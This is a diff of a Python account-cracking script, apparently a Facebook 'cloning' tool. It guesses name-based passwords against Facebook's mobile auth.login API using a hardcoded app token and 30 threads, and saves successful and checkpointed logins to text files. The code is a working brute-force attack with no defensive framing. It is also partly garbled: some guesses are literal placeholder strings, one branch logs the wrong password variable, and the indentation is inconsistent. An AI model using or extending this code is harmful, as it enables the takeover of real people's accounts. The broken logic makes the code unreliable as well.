@@ -693,7 +693,7 @@ def crack_select():
 							cp.close()
 							cps.append(uid+pass2)
 						else:
-							pass3 = name.lower()+"1234"
+							pass3 = name.lower()
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
@@ -743,57 +743,57 @@ def crack_select():
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
-										        else:
-											        pass6 = 'fastname'
-											        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-											        q = json.loads(data)
-											        if "access_token" in q:
-												        print(" \033[1;32m [RISHU-OK] "+uid+" ➤ "+pass6+"\033[0;97m")
-												        ok = open("hstok.txt", "a")
-												        ok.write(uid+"|"+pass5+"\n")
-												        ok.close()
-												        oks.append(uid+pass6)
-											        else:
-												        if "www.facebook.com" in q["error_msg"]:
-													        print(" \033[1;31m [RISHU-CP] "+uid+" \x1b[1;37m➤ \x1b[1;31m"+pass6+"\033[0;97m")
-													        cp = open("hstcp.txt", "a")
-													        cp.write(uid+"|"+pass6+"\n")
-													        cp.close()
-													        cps.append(uid+pass6)
 										                else:
-											                pass7 = 'fastname+lastname'
-											                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
+											                pass6 = 'fastname'
+											                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											                q = json.loads(data)
 											                if "access_token" in q:
-												                print(" \033[1;32m [RISHU-OK] "+uid+" ➤ "+pass7+"\033[0;97m")
+												                print(" \033[1;32m [RISHU-OK] "+uid+" ➤ "+pass6+"\033[0;97m")
 												                ok = open("hstok.txt", "a")
-												                ok.write(uid+"|"+pass7+"\n")
+												                ok.write(uid+"|"+pass5+"\n")
 												                ok.close()
-												                oks.append(uid+pass7)
+												                oks.append(uid+pass6)
 											                else:
 												                if "www.facebook.com" in q["error_msg"]:
-													                print(" \033[1;31m [RISHU-CP] "+uid+" \x1b[1;37m➤ \x1b[1;31m"+pass7+"\033[0;97m")
+													                print(" \033[1;31m [RISHU-CP] "+uid+" \x1b[1;37m➤ \x1b[1;31m"+pass6+"\033[0;97m")
 													                cp = open("hstcp.txt", "a")
-													                cp.write(uid+"|"+pass7+"\n")
+													                cp.write(uid+"|"+pass6+"\n")
 													                cp.close()
-													                cps.append(uid+pass7)
-										                        else:
-											                        pass8 = 'first+space+second'
-										                            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-											                        q = json.loads(data)
-											                        if "access_token" in q:
-												                        print(" \033[1;32m [RISHU-OK] "+uid+" ➤ "+pass8+"\033[0;97m")
-												                        ok = open("hstok.txt", "a")
-												                        ok.write(uid+"|"+pass8+"\n")
-												                        ok.close()
-												                        oks.append(uid+pass8)
-											                        else:
-												                        if "www.facebook.com" in q["error_msg"]:
-													                        print(" \033[1;31m [RISHU-CP] "+uid+" \x1b[1;37m➤ \x1b[1;31m"+pass8+"\033[0;97m")
-													                        cp = open("hstcp.txt", "a")
-													                        cp.write(uid+"|"+pass8+"\n")
-													                        cp.close()
-													                        cps.append(uid+pass8)
+													                cps.append(uid+pass6)
+										                                else:
+											                                pass7 = 'fastname+lastname'
+											                                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
+											                                q = json.loads(data)
+											                                if "access_token" in q:
+												                                print(" \033[1;32m [RISHU-OK] "+uid+" ➤ "+pass7+"\033[0;97m")
+												                                ok = open("hstok.txt", "a")
+												                                ok.write(uid+"|"+pass7+"\n")
+												                                ok.close()
+												                                oks.append(uid+pass7)
+											                                else:
+												                                if "www.facebook.com" in q["error_msg"]:
+													                                print(" \033[1;31m [RISHU-CP] "+uid+" \x1b[1;37m➤ \x1b[1;31m"+pass7+"\033[0;97m")
+													                                cp = open("hstcp.txt", "a")
+													                                cp.write(uid+"|"+pass7+"\n")
+													                                cp.close()
+													                                cps.append(uid+pass7)
+										                                                else:
+											                                                pass8 = 'first+space+second'
+										                                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
+											                                                q = json.loads(data)
+											                                                if "access_token" in q:
+												                                                print(" \033[1;32m [RISHU-OK] "+uid+" ➤ "+pass8+"\033[0;97m")
+												                                                ok = open("hstok.txt", "a")
+												                                                ok.write(uid+"|"+pass8+"\n")
+												                                                ok.close()
+												                                                oks.append(uid+pass8)
+											                                                else:
+												                                                if "www.facebook.com" in q["error_msg"]:
+													                                                print(" \033[1;31m [RISHU-CP] "+uid+" \x1b[1;37m➤ \x1b[1;31m"+pass8+"\033[0;97m")
+													                                                cp = open("hstcp.txt", "a")
+													                                                cp.write(uid+"|"+pass8+"\n")
+													                                                cp.close()
+													                                                cps.append(uid+pass8)
 		except:
 			pass
 	p = ThreadPool(30)
